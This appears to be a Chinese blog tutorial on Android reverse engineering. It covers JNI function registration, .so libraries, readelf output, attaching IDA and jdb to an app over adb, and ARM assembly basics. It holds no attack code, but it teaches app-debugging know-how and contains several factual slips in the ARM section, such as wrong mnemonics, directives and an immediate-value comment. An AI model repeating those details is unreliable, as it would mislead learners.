    <content type="html"><![CDATA[<p>Android JNI 编程及 ARM 汇编入门。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>Android Studio 3.5.3</p><h1 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h1><p>Android 程序分两层，Java 层和 Native 层。Java 层就是 Java 代码编译为 dex 文件，而 Native 层则是 C++ 代码编译为 so 文件（动态库）。两者使用 JNI（Java Native Interface）来进行链接。相比于 Java，Native 层安全性更加高，隐蔽性更加好，某种情况下效率更加高。Java 是跨平台的语言，而这跨平台的背后都是依靠 Java 虚拟机，虚拟机采用 C/C++ 编写，适配各个系统，通过 JNI 为上层 Java 提供各种服务，保证跨平台性。Java 程序中通过 JVM 加载并调用 JNI 程序来间接地调用目标原生函数。</p><p><img src="/pics/Android逆向入门/二/1.png" srcset="/img/loading.gif" alt></p><p>如果要进行 JNI 开发，直接在 Android Studio 中新建一个 C++ 项目即可。在调试过程中，可以新建一个 <code>log.h</code> 定义几个在 C++ 文件中进行日志输出的函数：</p><pre><code class="cpp">#include &lt;android/log.h&gt;#ifndef LOG_TAG#define LOG_TAG &quot;MY_TAG&quot;#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)#define LOGF(...) __android_log_print(ANDROID_LOG_FATAL, LOG_TAG, __VA_ARGS__)#endif</code></pre><p>在 Java 文件中添加日志输出：</p><pre><code class="java">public class MainActivity extends AppCompatActivity {    ...    @Override    protected void onCreate(Bundle savedInstanceState) {        ...        Log.d(&quot;Debug&quot;, &quot;infomation&quot;);    }    ...}</code></pre><p>在需要调用 JNI 的函数中加载动态库：</p><pre><code class="java">public class MainActivity extends AppCompatActivity {    // Used to load the &#39;native-lib&#39; library on application startup.    static {        System.loadLibrary(&quot;native-lib&quot;);    }    ...}</code></pre><h2 id="Native-函数注册"><a href="#Native-函数注册" class="headerlink" title="Native 函数注册"></a>Native 函数注册</h2><h3 id="静态注册"><a href="#静态注册" class="headerlink" title="静态注册"></a>静态注册</h3><p>静态注册的理解和使用方式简单，出错率低。但必须遵循注册规则，当需要更改类名、包名或者方法时，需要按照之前方法重新生成头文件，灵活性不高。</p><p>Java 文件中的 Native 声明：</p><pre><code class="java">public native String sayHello();</code></pre><p>静态注册在 cpp 文件中通过 JNIEXPORT 和 JNICALL 两个宏定义声明，在虚拟机加载 so 时发现上面两个宏定义的函数时就会链接到对应的 native 方法。so 中的名字为类名 + 函数名的组合，并且自带两个参数，即 <code>JNIEnv* env</code> 和 <code>jclass</code>（static 方法时）/<code>jobject</code>（普通方法时）：</p><pre><code class="cpp">#include &lt;jni.h&gt;#include &lt;string&gt;#include &quot;log.h&quot;extern &quot;C&quot; {JNIEXPORT jstring JNICALLJava_com_assassinq_easycpp_MainActivity_sayHello(JNIEnv *env, jobject obj) {    return env-&gt;NewStringUTF(&quot;Hello World&quot;);}}</code></pre><p>静态注册有一些缺点：</p><ol><li>Native 函数名称特别长，不利于书写；</li><li>每次新增或删除接口时需要重新生成文件，比较繁琐；</li><li>第一次调用时需要根据函数名建立索引，影响效率；</li><li>JNI 层的函数名是由 Java 接口名生成，很容易通过 hook 调用动态库中的函数。</li></ol><h3 id="动态注册"><a href="#动态注册" class="headerlink" title="动态注册"></a>动态注册</h3><p>动态注册在 JNI 层通过重载 <code>JNI_OnLoad()</code> 函数来实现，系统初始化 JNI 在加载时，会调用 <code>JNI_OnLoad()</code>，而卸载时会调用 <code>JNI_UnLoad()</code>。原理是通过自定义方法把 C/C++ 函数映射到 JAVA 定义的方法，不需要通过 JAVA 方法名查找匹配 Native 函数名，也就不需要遵循静态注册的命名规则。</p><p>cpp 文件中的函数定义如下：</p><pre><code class="cpp">jstring sayHi(JNIEnv *env, jobject obj) {    return env-&gt;NewStringUTF(&quot;Hi World&quot;);}</code></pre><p>通过内置函数 <code>RegisterNatives()</code> 实现自定义的注册方法：</p><pre><code class="cpp">static int registerNativeMethods(JNIEnv *env, const char *className, JNINativeMethod *gMethods, int numMethods) {    jclass clazz;    clazz = env-&gt;FindClass(className);    if (clazz == NULL) {        return JNI_FALSE;    }    if (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; 0) {        return JNI_FALSE;    }    return JNI_TRUE;}</code></pre><p>定义 gClassName 和 gMethods 两个变量，分别表示需要查找的类名和需要注册的方法信息：</p><pre><code class="cpp">static const char *gClassName = &quot;com/assassinq/easycpp/MainActivity&quot;;static JNINativeMethod gMethods[] = {        {&quot;sayHi&quot;, &quot;()Ljava/lang/String;&quot;, (void *) sayHi},};</code></pre><p>其中方法信息的结构体如下，第一个变量为方法名，第二个变量为方法签名（字符串类型，以 Smali 代码的方式），第三个变量为对应的函数指针：</p><pre><code class="cpp">typedef struct {    const char* name; // native 的方法名    const char* signature; // 方法签名，例如 ()Ljava/lang/String;    void*       fnPtr; // 函数指针} JNINativeMethod;</code></pre><p>最后重写 <code>JNI_OnLoad()</code> 函数：</p><pre><code class="cpp">JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) {    JNIEnv *env = NULL;    if (vm-&gt;GetEnv((void **)&amp;env, JNI_VERSION_1_6) != JNI_OK) {        LOGE(&quot;This jni version is not supported&quot;);        return -1;    }    if (registerNativeMethods(env, gClassName, gMethods, sizeof(gMethods) / sizeof(gMethods[0])) == JNI_FALSE) {        LOGE(&quot;Unable to register native methods&quot;);        return -1;    }    LOGE(&quot;Methods loaded successfully&quot;);    return JNI_VERSION_1_6;}</code></pre><h2 id="so-动态链接库"><a href="#so-动态链接库" class="headerlink" title="so 动态链接库"></a>so 动态链接库</h2><p>在编译过程中，可以修改 app 目录下的 build.gradle 中的内容，使用 android.defaultConfig.ndk.abiFilters 来指示 Gradle 要构建和打包的 ABI 版本，生成不同架构下的动态链接库：</p><pre><code>android {    ...    defaultConfig {        ...        ndk {            abiFilters &quot;armeabi-v7a&quot;, &quot;arm64-v8a&quot;, &quot;x86&quot;, &quot;x86_64&quot;        }    }    ...}</code></pre><p>so 文件一般存放在 apk 的 lib 目录下（NDK r17 版本开始已经去掉了 armeabi、mips、mips64 的 ABI 支持）：</p><ul><li>armeabi-v7a：第 7 代及以上的 ARM 处理器。2011 年 15 月以后的生产的大部分 Android 设备都使用它。</li><li>arm64-v8a：第 8 代、64 位 ARM 处理器，很少设备，三星 Galaxy S6 是其中之一。</li><li>armabi：第 5 代、第 6 代的 ARM 处理器，早期的手机用的比较多。</li><li>x86：Intel x86（平板、模拟器用得比较多）。</li><li>x86_64：Intel x64（64 位的平板）。</li><li>…</li></ul><h2 id="IDA-反编译-so-文件"><a href="#IDA-反编译-so-文件" class="headerlink" title="IDA 反编译 so 文件"></a>IDA 反编译 so 文件</h2><p>用 IDA 打开编译后的 apk，可以看到 lib 中存在一个 libnative-lib.so：</p><p><img src="/pics/Android逆向入门/二/2.png" srcset="/img/loading.gif" alt></p><p>查看静态注册函数的反编译结果：</p><pre><code class="cpp">int __fastcall Java_com_assassinq_easycpp_MainActivity_sayHello(_JNIEnv *a1){  return _JNIEnv::NewStringUTF(a1, &quot;Hello World&quot;);}</code></pre><p>查看动态注册的函数的反编译结果：</p><pre><code class="cpp">int __fastcall sayHi(_JNIEnv *a1){  return _JNIEnv::NewStringUTF(a1, &quot;Hi World&quot;);}</code></pre><h1 id="IDA-动态调试-apk"><a href="#IDA-动态调试-apk" class="headerlink" title="IDA 动态调试 apk"></a>IDA 动态调试 apk</h1><ol><li>安装 apk 到手机：<code>adb install example.apk</code></li><li>将 IDA 目录下的调试文件 push 到手机上：<code>adb push android_server /data/local/tmp</code></li><li>赋给程序可执行权限：<code>chmod 777 android_server</code></li><li>启动调试服务端：<code>./android_server</code> （自定义设置端口方式：<code>-p23333</code>）</li><li>手机端端口转发至电脑端：<code>adb forward tcp:[pc_port] tcp:[mobile_port]</code></li><li>IDA 调试端口设置：Debugger-&gt;Process option</li><li>启动程序：<code>adb shell am start -D -n packageName/activityName</code></li><li>IDA 挂接到 Native 层：Debugger-&gt;Attach to process…</li><li>打开 monitor，监听并挂接到 JAVA 层：<code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code></li></ol><p><img src="/pics/Android逆向入门/二/3.png" srcset="/img/loading.gif" alt></p><p>PS：如果在 monitor 中没有找到对应的进程，检查一下调试的程序中 AndroidManifest.xml 中是否设置了 <code>android:debuggable=&quot;true&quot;</code>（若没有则修改后并重新打包）。</p><h1 id="动态链接库文件（-so-文件）"><a href="#动态链接库文件（-so-文件）" class="headerlink" title="动态链接库文件（.so 文件）"></a>动态链接库文件（.so 文件）</h1><p>加载顺序：</p><pre><code>init_array -&gt; JNI_OnLoad -&gt; ... -&gt; fini_array</code></pre><h2 id="so-文件查看工具"><a href="#so-文件查看工具" class="headerlink" title="so 文件查看工具"></a>so 文件查看工具</h2><h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h3><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>-a</code></td><td style="text-align:center">显示 so 文件的所有信息</td></tr><tr><td style="text-align:center"><code>-h</code></td><td style="text-align:center">显示 ELF 文件头</td></tr><tr><td style="text-align:center"><code>-l</code></td><td style="text-align:center">显示 Program Headers，动态加载时需要的信息</td></tr><tr><td style="text-align:center"><code>-S</code></td><td style="text-align:center">显示 Section Headers，静态加载分析时需要的信息</td></tr><tr><td style="text-align:center"><code>-e</code></td><td style="text-align:center">显示 ELF Header、Section Headers、Program Headers 信息</td></tr><tr><td style="text-align:center"><code>-s</code></td><td style="text-align:center">显示符号表（Symbol Table）</td></tr><tr><td style="text-align:center"><code>-d</code></td><td style="text-align:center">显示动态节区（Dynamic Section）</td></tr></tbody></table><p>显示 ELF 文件头：</p><pre><code class="bash">$ readelf -h libnative-lib.soELF Header:  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00  Class:                             ELF32  Data:                              2&#39;s complement, little endian  Version:                           1 (current)  OS/ABI:                            UNIX - System V  ABI Version:                       0  Type:                              DYN (Shared object file)  Machine:                           ARM  Version:                           0x1  Entry point address:               0x0  Start of program headers:          52 (bytes into file)  Start of section headers:          12932 (bytes into file)  Flags:                             0x5000200, Version5 EABI, soft-float ABI  Size of this header:               52 (bytes)  Size of program headers:           32 (bytes)  Number of program headers:         8  Size of section headers:           40 (bytes)  Number of section headers:         27  Section header string table index: 26</code></pre><p>显示 Program headers：</p><pre><code class="bash">$ readelf -l libnative-lib.soElf file type is DYN (Shared object file)Entry point 0x0There are 8 program headers, starting at offset 52Program Headers:  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align  PHDR           0x000034 0x00000034 0x00000034 0x00100 0x00100 R   0x4  LOAD           0x000000 0x00000000 0x00000000 0x02ab6 0x02ab6 R E 0x1000  LOAD           0x002e3c 0x00003e3c 0x00003e3c 0x001dc 0x001dd RW  0x1000  DYNAMIC        0x002e8c 0x00003e8c 0x00003e8c 0x00110 0x00110 RW  0x4  NOTE           0x000134 0x00000134 0x00000134 0x000bc 0x000bc R   0x4  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10  EXIDX          0x0021f4 0x000021f4 0x000021f4 0x001b8 0x001b8 R   0x4  GNU_RELRO      0x002e3c 0x00003e3c 0x00003e3c 0x001c4 0x001c4 RW  0x4 Section to Segment mapping:  Segment Sections...   00   01     .note.android.ident .note.gnu.build-id .dynsym .dynstr .gnu.hash .hash .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.exidx .ARM.extab .rodata   02     .fini_array .data.rel.ro .dynamic .got .data .bss   03     .dynamic   04     .note.android.ident .note.gnu.build-id   05   06     .ARM.exidx   07     .fini_array .data.rel.ro .dynamic .got</code></pre><p>显示 Section headers：</p><pre><code class="bash">$ readelf -S libnative-lib.soThere are 27 section headers, starting at offset 0x3284:Section Headers:  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al  [ 0]                   NULL            00000000 000000 000000 00      0   0  0  [ 1] .note.android.ide NOTE            00000134 000134 000098 00   A  0   0  4  [ 2] .note.gnu.build-i NOTE            000001cc 0001cc 000024 00   A  0   0  4  [ 3] .dynsym           DYNSYM          000001f0 0001f0 000190 10   A  4   1  4  [ 4] .dynstr           STRTAB          00000380 000380 0001d3 00   A  0   0  1  [ 5] .gnu.hash         GNU_HASH        00000554 000554 00004c 04   A  3   0  4  [ 6] .hash             HASH            000005a0 0005a0 0000b0 04   A  3   0  4  [ 7] .gnu.version      VERSYM          00000650 000650 000032 02   A  3   0  2  [ 8] .gnu.version_d    VERDEF          00000684 000684 00001c 00   A  4   1  4  [ 9] .gnu.version_r    VERNEED         000006a0 0006a0 000040 00   A  4   2  4  [10] .rel.dyn          REL             000006e0 0006e0 0000e8 08   A  3   0  4  [11] .rel.plt          REL             000007c8 0007c8 000088 08  AI  3  20  4  [12] .plt              PROGBITS        00000850 000850 0000e0 00  AX  0   0  4  [13] .text             PROGBITS        00000930 000930 0018c4 00  AX  0   0  4  [14] .ARM.exidx        ARM_EXIDX       000021f4 0021f4 0001b8 08  AL 13   0  4  [15] .ARM.extab        PROGBITS        000023ac 0023ac 0001a4 00   A  0   0  4  [16] .rodata           PROGBITS        00002550 002550 000566 01 AMS  0   0  1  [17] .fini_array       FINI_ARRAY      00003e3c 002e3c 000008 04  WA  0   0  4  [18] .data.rel.ro      PROGBITS        00003e44 002e44 000048 00  WA  0   0  4  [19] .dynamic          DYNAMIC         00003e8c 002e8c 000110 08  WA  4   0  4  [20] .got              PROGBITS        00003f9c 002f9c 000064 00  WA  0   0  4  [21] .data             PROGBITS        00004000 003000 000018 00  WA  0   0  4  [22] .bss              NOBITS          00004018 003018 000001 00  WA  0   0  1  [23] .comment          PROGBITS        00000000 003018 000109 01  MS  0   0  1  [24] .note.gnu.gold-ve NOTE            00000000 003124 00001c 00      0   0  4  [25] .ARM.attributes   ARM_ATTRIBUTES  00000000 003140 000034 00      0   0  1  [26] .shstrtab         STRTAB          00000000 003174 00010f 00      0   0  1Key to Flags:  W (write), A (alloc), X (execute), M (merge), S (strings)  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)  O (extra OS processing required) o (OS specific), p (processor specific)</code></pre><p>显示符号表：</p><pre><code class="bash">$ readelf -s libnative-lib.soSymbol table &#39;.dynsym&#39; contains 25 entries:   Num:    Value  Size Type    Bind   Vis      Ndx Name     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND __cxa_atexit@LIBC (2)     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND __cxa_finalize@LIBC (2)     3: 00000000     0 OBJECT  GLOBAL DEFAULT  UND __stack_chk_guard@LIBC (2)     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@LIBC (2)     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND __android_log_print     6: 00000000     0 OBJECT  GLOBAL DEFAULT  UND __sF@LIBC (2)     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND abort@LIBC (2)     8: 00000000     0 FUNC    GLOBAL DEFAULT  UND fflush@LIBC (2)     9: 00000000     0 FUNC    GLOBAL DEFAULT  UND fprintf@LIBC (2)    10: 00000000     0 FUNC    GLOBAL DEFAULT  UND dladdr@LIBC (3)    11: 00000000     0 FUNC    GLOBAL DEFAULT  UND __aeabi_memclr8    12: 00000000     0 FUNC    GLOBAL DEFAULT  UND __aeabi_memcpy    13: 00000000     0 FUNC    GLOBAL DEFAULT  UND __gnu_Unwind_Find_exidx    14: 00000000     0 FUNC    GLOBAL DEFAULT  UND snprintf@LIBC (2)    15: 00004018     0 NOTYPE  GLOBAL DEFAULT  ABS _edata    16: 00004019     0 NOTYPE  GLOBAL DEFAULT  ABS _end    17: 00000975    36 FUNC    GLOBAL DEFAULT   13 Java_com_assassinq_easycp    18: 00000999    44 FUNC    WEAK   DEFAULT   13 _ZN7_JNIEnv12NewStringUTF    19: 00000b87    72 FUNC    WEAK   DEFAULT   13 _ZN7_JNIEnv15RegisterNati    20: 00000b5d    42 FUNC    WEAK   DEFAULT   13 _ZN7_JNIEnv9FindClassEPKc    21: 00004018     0 NOTYPE  GLOBAL DEFAULT  ABS __bss_start    22: 000009e9   224 FUNC    GLOBAL DEFAULT   13 JNI_OnLoad    23: 00000ac9    52 FUNC    WEAK   DEFAULT   13 _ZN7_JavaVM6GetEnvEPPvi    24: 000009c5    36 FUNC    GLOBAL DEFAULT   13 sayHi</code></pre><p>显示 Dynamic Section：</p><pre><code class="bash">$ readelf -d libnative-lib.soDynamic section at offset 0x2e8c contains 29 entries:  Tag        Type                         Name/Value 0x00000003 (PLTGOT)                     0x3fb0 0x00000002 (PLTRELSZ)                   136 (bytes) 0x00000017 (JMPREL)                     0x7c8 0x00000014 (PLTREL)                     REL 0x00000011 (REL)                        0x6e0 0x00000012 (RELSZ)                      232 (bytes) 0x00000013 (RELENT)                     8 (bytes) 0x6ffffffa (RELCOUNT)                   26 0x00000006 (SYMTAB)                     0x1f0 0x0000000b (SYMENT)                     16 (bytes) 0x00000005 (STRTAB)                     0x380 0x0000000a (STRSZ)                      467 (bytes) 0x6ffffef5 (GNU_HASH)                   0x554 0x00000004 (HASH)                       0x5a0 0x00000001 (NEEDED)                     Shared library: [liblog.so] 0x00000001 (NEEDED)                     Shared library: [libm.so] 0x00000001 (NEEDED)                     Shared library: [libdl.so] 0x00000001 (NEEDED)                     Shared library: [libc.so] 0x0000000e (SONAME)                     Library soname: [libnative-lib.so] 0x0000001a (FINI_ARRAY)                 0x3e3c 0x0000001c (FINI_ARRAYSZ)               8 (bytes) 0x0000001e (FLAGS)                      BIND_NOW 0x6ffffffb (FLAGS_1)                    Flags: NOW 0x6ffffff0 (VERSYM)                     0x650 0x6ffffffc (VERDEF)                     0x684 0x6ffffffd (VERDEFNUM)                  1 0x6ffffffe (VERNEED)                    0x6a0 0x6fffffff (VERNEEDNUM)                 2 0x00000000 (NULL)                       0x0</code></pre><h3 id="SO-Helper"><a href="#SO-Helper" class="headerlink" title="SO Helper"></a>SO Helper</h3><p>无名侠大佬开发的软件。可以用来快速地获取 so 文件的一些基本信息，提供较弱的汇编功能。</p><h1 id="ARM-汇编代码"><a href="#ARM-汇编代码" class="headerlink" title="ARM 汇编代码"></a>ARM 汇编代码</h1><p>ARM 是 ARM 公司的 32 位处理器，其汇编指令的机器码就是 32 位。</p><ol><li>ARM 汇编语言是一门“低级”语言可以和系统的底层相互沟通；</li><li>ARM 汇编语言编写的程序运行速度快，占用内存少；</li><li>ARM 编写的代码难懂，难以维护；</li><li>C 语言能实现的 ARM 汇编语言都能实现；</li><li>ARM 具有 31 个通用寄存器，6 个状态寄存器；</li><li>ARM 处理器支持 7 种运行模式。<ol><li>用户模式：ARM 处理器正常的程序执行状态。</li><li>快速中断模式：用于高速数据传输或通道处理。</li><li>外部中断模式：用于通用的中断处理。</li><li>管理模式：操作系统使用的保护模式。</li><li>数据访问终止模式：当数据或指令预取终止时进如该模式，可用于模拟存储及存储保护。</li><li>系统模式：运行具有特权的操作系统任务。</li><li>未定义指令中止模式：当未定义的指令执行时进入该模式。</li></ol></li></ol><blockquote><p>ARM 汇编难以分析的原因：IDA 自身的缺陷；函数库与类有时无法识别；自身对 ARM 汇编的熟练度。</p></blockquote><h2 id="函数参数传递"><a href="#函数参数传递" class="headerlink" title="函数参数传递"></a>函数参数传递</h2><p>遵循 ATPCS 规则，前 4 个参数使用 R0~R3 传递，剩余参数通过堆栈传递。</p><h2 id="ARM-和-Thumb"><a href="#ARM-和-Thumb" class="headerlink" title="ARM 和 Thumb"></a>ARM 和 Thumb</h2><p>Thumb 是 16 位的 ARM 汇编。一般地，ARM 每行代码占 4 个字节码，Thumb 每个指令占 2 个字节。两者不能混用，但可以通过 BX、BLX 等指令在跳转的时候实现切换。在动态调试的时候，IDA 对 ARM 和 Thumb 的分析会混淆，可以用 Alt+G 来修改相应的识别。</p><h2 id="ARM-寄存器"><a href="#ARM-寄存器" class="headerlink" title="ARM 寄存器"></a>ARM 寄存器</h2><ul><li>R0-R7：通用寄存器</li><li>R8-R10：不常用的通用寄存器</li><li>R11：基质寄存器（FP）</li><li>R12：暂时寄存器（IP）</li><li>R13：堆栈制作（SP）</li><li>R14：链接寄存器（LR）</li><li>CPSR：状态寄存器</li></ul><h2 id="ARM-指令"><a href="#ARM-指令" class="headerlink" title="ARM 指令"></a>ARM 指令</h2><h3 id="寄存器交互指令"><a href="#寄存器交互指令" class="headerlink" title="寄存器交互指令"></a>寄存器交互指令</h3><ul><li>LDR：从存储器中加载数据到寄存器。<ul><li><code>LDR R1, [R2]</code>：把 R2 指向的位置的数据给 R1</li></ul></li><li>STR：把寄存器的数据存储到存储器<ul><li><code>STR R1, [R2]</code>：在 R2 指向的地址，存储 R1</li></ul></li><li>LDM：将存储器的数据加载到一个寄存器列表。<ul><li><code>LDM R0, {R1, R2, R3}</code>：把 R0 中的数据一次加载到 R1、R2、R3</li></ul></li><li>SDM：将一个寄存器列表的数据存储到指定的存储器<ul><li><code>SDM R0, {R1, R2, R3}</code>：把 R1、R2、R3 加载到 R0 单元</li></ul></li><li>PUSH：入栈</li><li>POP：出栈</li></ul><h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><ul><li>MOV：将立即数或寄存器的数据传送到目标寄存器</li></ul><h3 id="数据算数运算指令"><a href="#数据算数运算指令" class="headerlink" title="数据算数运算指令"></a>数据算数运算指令</h3><h4 id="ADD（加法）"><a href="#ADD（加法）" class="headerlink" title="ADD（加法）"></a>ADD（加法）</h4><p>ADD 将把两个操作数加起来，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值。</p><pre><code class="arm">ADD R0, R1, R2 @ R0 = R1 + R2ADD R0, R1, #256 @ R0 = R1 + 256ADD R0, R2, R3, LSL#1 @ R0 = R2 + (R3 &lt;&lt; 1)</code></pre><p>加法可以在有符号和无符号数上进行。</p><ul><li>ADC：带进位的加法</li></ul><h4 id="SUB（减法）"><a href="#SUB（减法）" class="headerlink" title="SUB（减法）"></a>SUB（减法）</h4><p>SUB 用操作数 1 减去操作数 2，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值。</p><pre><code class="arm">SUB R0, R1, R2 @ R0 = R1 - R2SUB R0, R1, #256 @ R0 = R1 - 256SUB R0, R2, R3, LSL#1 @ R0 = R2 - (R3 &lt;&lt; 1)</code></pre><p>减法可以在有符号和无符号数上进行。</p><ul><li>SBC：带进位的减法</li></ul><h4 id="MUL（乘法）和-DIV（除法）"><a href="#MUL（乘法）和-DIV（除法）" class="headerlink" title="MUL（乘法）和 DIV（除法）"></a>MUL（乘法）和 DIV（除法）</h4><ul><li>给出的所有操作数、和目的寄存器必须为简单的寄存器。</li><li>不能对操作数 2 使用立即值或被移位的寄存器。</li><li>目的寄存器和操作数 1 必须是不同的寄存器。</li><li>不能指定 R15 为目的寄存器</li></ul><p>MUL 提供 32 位整数乘法。如果操作数是有符号的，可以假定结果也是有符号的。</p><ul><li>MLA：带累加的乘法</li></ul><p>除法指令 DIV 的条件与乘法类似。</p><ul><li>SDIV：带符号除法</li><li>UDIV：不带符号位除法</li></ul><h3 id="数据逻辑运算指令"><a href="#数据逻辑运算指令" class="headerlink" title="数据逻辑运算指令"></a>数据逻辑运算指令</h3><ul><li>AND：与</li><li>ORR：或</li><li>EOR：异或</li><li>LSL：逻辑左移</li><li>LSR：逻辑右移</li></ul><h3 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h3><ul><li>CMP：比较指令</li></ul><h3 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h3><ul><li>SWT：切换用户模式</li><li>DCB：伪指令</li></ul><h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><ul><li>B：无条件跳转</li><li>BL：带链接的无条件跳转</li><li>BLX：带状态的无条件跳转</li><li>BNE：不相等跳转</li><li>BEQ：相等跳转</li></ul><h4 id="偏移地址计算"><a href="#偏移地址计算" class="headerlink" title="偏移地址计算"></a>偏移地址计算</h4><ul><li>ARM：低 27 位是偏移位置<ul><li>偏移 = (目标地址 - 当前 PC 地址) / 指令长度</li><li>正数下跳，负数上跳</li></ul></li><li>Thumb 同理</li><li>目标地址 = 偏移 * 指令长度 + 当前偏移地址</li></ul><h2 id="ARM-代码编写"><a href="#ARM-代码编写" class="headerlink" title="ARM 代码编写"></a>ARM 代码编写</h2><p>处理器架构定义：</p><ul><li><code>.arch</code> 指定了 ARM 处理器架构。</li><li><code>armv5te</code> 表示本程序在 armv5te 架构处理器上运行。</li><li><code>.fpu</code> 指定了协处理器的类型。</li><li><code>softvfp</code> 表示使用浮点运算库来模拟协处理运算。</li><li><code>.ebi_attribute</code> 指定了一些接口属性。</li></ul><pre><code class="arm">.arch armv5te @处理器架构.fpu softvfp  @协处理器类型.ebi_attribute 20, 1 @接口属性.ebi_attribute 21, 1.ebi_attribute 23, 1.ebi_attribute 24, 1.ebi_attribute 25, 1.ebi_attribute 26, 1.ebi_attribute 30, 1.ebi_attribute 18, 1</code></pre><p>段定义：</p><ul><li><code>.section</code>：定义只读数据，属性是默认</li><li><code>.text</code>：定义了代码段。</li></ul><p>注释方法：</p><ul><li><code>/.../</code>：多行注释</li><li><code>@</code>：单行注释</li></ul><p>标号方式（和 8086 类似）：</p><pre><code class="arm">loop:    ...end loop</code></pre><p>程序中所有以“.”开头的指令都是汇编指令，他们不属于 ARM 指令集：</p><ul><li>.file：制定了源文件名。</li><li>.align：代码对其方式。</li><li>.ascii：声明字符串。</li><li>.global：声明全局变量。</li><li>.type：指定符号的类型。</li></ul><p>声明函数的方法：</p><pre><code class="arm">.global 函数名.type 函数名, %function函数名:    &lt;...函数体...&gt;声明一个实现两个数相加的函数的代码.global MyAdd.type MyAdd, &amp;functionMyAdd:    ADD R0, R0, R1    MOV PC, LR</code></pre><h2 id="ARM-处理器寻址方式"><a href="#ARM-处理器寻址方式" class="headerlink" title="ARM 处理器寻址方式"></a>ARM 处理器寻址方式</h2><h3 id="立即寻址"><a href="#立即寻址" class="headerlink" title="立即寻址"></a>立即寻址</h3><pre><code class="arm">@ 井号（#）作为前缀，表示16进制时以“0x”开头MOV R0，#1234 @ R0=0x1234</code></pre><h3 id="寄存器寻址"><a href="#寄存器寻址" class="headerlink" title="寄存器寻址"></a>寄存器寻址</h3><pre><code class="arm">MOV R0, R1 @ R0=R1</code></pre><h3 id="寄存器移位寻址"><a href="#寄存器移位寻址" class="headerlink" title="寄存器移位寻址"></a>寄存器移位寻址</h3><p>五种移位操作：</p><ul><li>LSL：逻辑左移，移位后寄存器空出的低位补 0；</li><li>LSR：逻辑右移，移位后寄存器空出的高位补 0；</li><li>ASR：算数右移，移动过程中符号位不变。如果操作数是整数，则移位后空出的高位补 0，否则补 1；</li><li>ROR：循环右移，移位后移出的低位填入移位空出的高位；</li><li>RRX：带扩展的循环右移，操作数右移移位，移位空出的高位用 C 标志的值填充。</li></ul><pre><code class="arm">MOV R0, R1, LSL#2 @ R0=R1*4</code></pre><h3 id="寄存器间接寻址"><a href="#寄存器间接寻址" class="headerlink" title="寄存器间接寻址"></a>寄存器间接寻址</h3><pre><code class="arm">LDR R0，[R1] @ 将R1寄存器中的值作为地址，取出地址中的值赋予R0</code></pre><h3 id="寄存器间接基址偏移寻址"><a href="#寄存器间接基址偏移寻址" class="headerlink" title="寄存器间接基址偏移寻址"></a>寄存器间接基址偏移寻址</h3><pre><code class="arm">LDR R0, [R1, #-4] @ 将R1寄存器的值-0x4的值作为地址，取出地址中的值给R0</code></pre><h3 id="多寄存器寻址"><a href="#多寄存器寻址" class="headerlink" title="多寄存器寻址"></a>多寄存器寻址</h3><pre><code class="arm">@ LDM 是数据加载命令，指令的后缀IA表示每次执行完成加载操作后R0寄存器的值自增1LDMIA R0, {R1, R2, R3, R4}@ R1=[R0]@ R2=[R0+#4]@ R3=[R0+#8]@ R4=[R0+#12]@ ARM中，字表示的是一个32位。这里+#4的原因是因为32位占4个字节</code></pre><h3 id="堆栈寻址"><a href="#堆栈寻址" class="headerlink" title="堆栈寻址"></a>堆栈寻址</h3><pre><code class="arm">STMFD SP!, {R1-R7, LR} @ 入栈，多用于保存子程序堆栈LDMFD SP!, {R1-R7, LR} @ 出栈，多用于恢复子程序堆栈</code></pre><h3 id="块拷贝寻址"><a href="#块拷贝寻址" class="headerlink" title="块拷贝寻址"></a>块拷贝寻址</h3><p>块拷贝可实现连续地址数据从存储器的某一位置拷贝到另一位置。</p><pre><code class="arm">LDMIA R0!, {R1-R3} @ 从寄存器指向的存储单元中读取3个字到R1-R3寄存器。</code></pre><h3 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h3><p>相对寻址一程序计数器 PC 的当前值为基地址，指令中的地址标号作为偏移量，将两者相加之后得到的操作数的有效地址。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://blog.csdn.net/miao_007/article/details/87632758" target="_blank" 